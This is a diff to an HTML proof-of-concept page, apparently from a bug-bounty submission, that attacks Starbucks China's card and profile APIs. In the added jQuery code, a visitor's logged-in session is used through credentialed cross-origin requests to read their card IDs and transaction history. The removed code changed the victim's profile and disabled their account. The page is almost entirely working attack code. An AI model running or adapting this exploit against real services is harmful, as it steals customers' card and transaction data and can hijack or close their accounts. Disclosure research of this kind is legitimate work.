@@ -4,7 +4,7 @@
 <meta name="referrer" content="never">
 <script src=../jquery-3.4.1.min.js></script>
 </head>
-<title>steal the informations</title>
+<title>steal the cards informations</title>
 </br>
 </br>
 <div>
@@ -19,14 +19,8 @@ steal customer's cards informaiton
 </br>
 </br>
 <script>
-	
+	var cardsID;
 	function stealCustomerCards(){
-		var data = {};
-		var domain = {};
-		var filter = {};
-		domain["domain"] = "svc";
-		filter["filter"] = domain;
-		data["data"] = filter;
 		$.ajax({
 			    url : 'https://cards.starbucks.com.cn/cards',
 			    type : 'POST',
@@ -38,7 +32,8 @@ steal customer's cards informaiton
 			 },
 			    success : function(response, textStatus, jqXhr) {
 				$("＃customer").val(response);
-                               
+				cardsID = response.data[0].id;
+                                console.log(cardsID);
 			    },
 			    error : function(jqXHR, textStatus, errorThrown) {
 				// log the error to the console
@@ -51,22 +46,20 @@ steal customer's cards informaiton
 	}
 	
 		
-	function modifyProfile(){
-		var data = {};
-		data["firstName"] = "attackerFirstName";
-		data["lastName"] = "attackerlastName";
-		data["gender"] = "Male";
+	function stealCardsTransactions(){
+		var data = '{"data":{"id":"'+cardsID+'","page":{"page":1,"limit":10},"isNew":true}}';
 		$.ajax({
-			    url : 'https://profile.starbucks.com.cn/api/Customers/update/patch',
+			    url : 'https://cards.starbucks.com.cn/cards/transactions',
 			    type : 'POST',
 			    dataType:'json',
-			    contentType:'application/json',
+			    contentType:'application/vnd.api+json',
 			    data:JSON.stringify(data),
 			    xhrFields: {
 			     withCredentials: true
 			 },
 			    success : function(response, textStatus, jqXhr) {
-				alert("Successfully !Your account's profile have been modified!");
+				$("＃customer").val(response);
+                                console.log(response);
 			    },
 			    error : function(jqXHR, textStatus, errorThrown) {
 				// log the error to the console
@@ -78,30 +71,6 @@ steal customer's cards informaiton
         });
 	}
 	
-	function disable(){
-		var data = {};
-		data["reason1"] = "Customer closed account";
-		$.ajax({
-			    url : 'https://profile.starbucks.com.cn/api/Customers/disable',
-			    type : 'POST',
-			    dataType:'json',
-			    contentType:'application/json',
-			    data:JSON.stringify(data),
-			    xhrFields: {
-			     withCredentials: true
-			 },
-			    success : function(response, textStatus, jqXhr) {
-				alert("Successfully !Your account's was disabled");
-			    },
-			    error : function(jqXHR, textStatus, errorThrown) {
-				// log the error to the console
-				console.log("The following error occured: " + textStatus, errorThrown);
-			    },
-			    complete : function() {
-				console.log("complete");
-			    }
-        });
-	}
 	
 </script>
 <a href="https://hackerone.com/johnstone">hacker1 johnstone</a>
